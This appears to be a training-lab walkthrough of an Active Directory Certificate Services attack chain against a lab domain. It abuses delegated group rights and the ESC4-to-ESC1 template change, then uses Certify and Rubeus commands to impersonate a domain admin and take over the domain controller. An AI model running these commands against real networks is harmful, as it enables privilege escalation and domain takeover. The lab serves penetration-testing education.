# Step-by-Step Lab Solution Steps

This attack chain demonstrates how misconfigured ADCS templates combined with weak AD permissions can lead to domain takeover.

## Key Tools Needed

- **Certify1.exe** - Certificate template manipulation
- **Certify2.exe** - Certificate template manipulation (new version)
- **Rubeus.exe** - Kerberos authentication (optional)
- **PowerShell** - Certificate requests and session management
- **Active Directory PowerShell Module** - For AD modifications (RSAT)
- **ADeleg** - an Active Directory delegation management tool
- **ADeleginator** - A tool to find insecure trustee and resource delegations in Active Directory. ADeleginator is a wrapper around [ADeleg](https://github.com/mtth-bfft/adeleg/), a tool written by [@mtth-bfft](https://github.com/mtth-bfft).
- **Locksmith** - A small tool built to find and fix common misconfigurations in Active Directory Certificate Services.
- **NetTools** - The Swiss army knife of AD troubleshooting

## Success Indicators

✅ Identification of insecure delegated permissions

✅ Suzie added to Template Managers group

✅ Webserver2026 template modified with ESC1 settings

✅ Certificate issued with ITAdmin subject

✅ PSRemoting session established to DC01

✅ Confirmed Domain Admin privileges

## Lab Prep

1. Launch Hyper-V
2. Start Virtual Machines
3. Login to Workstation as Suzie:Password123!

## Phase 0: Misconfiguration Discovery (Identify Control Path)

**Objective**: Identify insecure delegated permissions that allow for a control path

**ADeleg**

```markdown
1. Open c:\tools
2. Double click ADeleg.exe, click Connect
3. Click View --> Index View By --> Trustees (click ok on the warning message)
4. Click the + next to the domain tree on the left
5. Click the + next to CN=Users
6. Click on CN=Domain Users
7. Find the entry for Template Managers that Allows Write all Properties (FullControl)

*Now is a great time to screenshot for evidence
```

**Invoke-ADeleginator**

```markdown
1. Click Start --> search for PowerShell_ISE and open it
2. Click Open (folder icon)
3. Navigate to C:\tools & open Invoke-ADeleginator
4. Click the green > (Run Script) button or press F5
5. In the command window, type: cd c:\tools, then press Enter
6. Then type: Invoke-ADeleginator, then press Enter
7. Now find the ADeleg_InsecureTrusteeDelegation report and open it with Notepad
8. Find the entry where Domain Users has Write all properties (FullControl) over Template Managers

*Now is a great time to screenshot for evidence
```

**NetTools**

```markdown
1. Double click NetTools.exe
2. Click Assigned Trustees under the Access Control section on the left
3. Click Go
4. Find the entry for the trustee Domain Users
5. Right click on Domain Users --> click Find Assignments
6. Find the DN for CN=Template Managers and click on it

*Now is a great time to screenshot for evidence
```

## Phase 1: Control Path (Add Suzie to Template Managers)

**Objective:** Exploit GenericAll on "Template Managers" group to add compromised user Suzie

```powershell
# Launch PowerShell_ISE if not already open & close Adeleginator
Click Start --> search for PowerShell_ISE and open it
Close ADeleginator or open a new PowerShell file

# Check current group membership
Get-ADGroup "Template Managers" -Properties Members | Select-Object -ExpandProperty Members

# Add Suzie to the group (run as Domain User with GenericAll)
Add-ADGroupMember -Identity "Template Managers" -Members "Suzie" -ErrorAction SilentlyContinue

# *Now is a great time to screenshot for evidence

# Verify addition
Get-ADGroup "Template Managers" -Properties Members | Select-Object -ExpandProperty Members

# Log out/log on or do runas
Log out and log back into Workstation123 as Suzie:Password123!
```

## Phase 2: ESC4 → ESC1 Conversion (Modify the Webserver2026 template)

**Objective:** Modify certificate template settings to enable ESC1 abuse

```powershell
# Open PowerShell_ISE
Click Start --> search for PowerShell_ISE and open it

# Navigate to c:\tools in the PowerShell_ISE command window
cd c:\tools

# check for enabled, vulnerable certificate templates
# Note, we don't see the vulnerable template here because according to these tools it's not vulnerable, but it is...
.\Certify1.exe find /vulnerable

# Show all enabled templates and their permissions
.\Certify1.exe find /showallpermissions

# Using Certify to enable alternate SAN
.\Certify2.exe manage-template --template Webserver2026 --supply-subject --client-auth

# *Now is a great time to screenshot for evidence

# Check template settings to verify
.\Certify1.exe find /showallpermissions

# *Now is a great time to screenshot for evidence
```

## Phase 3: ESC1 Attack (Request impersonation certificate with the Webserver2026 template)

**Objective:** Request cert as Domain Admin (ITAdmin) using Suzie's account

```powershell
# List all CAs to find the correct CA name
.\Certify1.exe find cas

# Obtain the SID for the ITAdmin account
(Get-ADUser ITadmin -Properties ObjectSID | Select -ExpandProperty ObjectSID).Value

# Request certificate with ITAdmin as UPN (Subject Alternative Name)
.\Certify2.exe request --ca "DC1.acme.corp\acme-DC1-CA" --template Webserver2026 --upn ITAdmin --sid S-1-5-21-2388369469-2401502294-4092722181-1104

# *Now is a great time to screenshot for evidence

# Highlight and copy the certificate base64 blob. Create a new PowerShell_ISE file, paste in the base64 blob
# Press Ctrl + H
# Enter [\r\n]+ in the Find field
# Click Regular expression
# Click Replace All
# Then highlight the entire blob and copy it
# Replace <cert b64 goes heer> with the blob
```

## Phase 4: Impersonate ITAdmin (Using the certificate we just requested)

**Objective:** Use the certificate to authenticate as & impersonate ITAdmin

```powershell
# Test access to the DC1
dir \\DC1\c$

# Request kerberos ticket for ITAdmin using the certificate we just created
.\Rubeus.exe asktgt /user:ITAdmin /domain:acme.corp /dc:DC1.acme.corp /ptt /certificate:<cert b64 goes here>

# *Now is a great time to screenshot for evidence

# Create PSSession as ITAdmin to DC01
$session = New-PSSession -ComputerName "DC1"

# Enter the session
Enter-PSSession $session

# Verify Domain Admin access
whoami /groups
hostname
Get-Date

# *Now is a great time to screenshot for evidence
```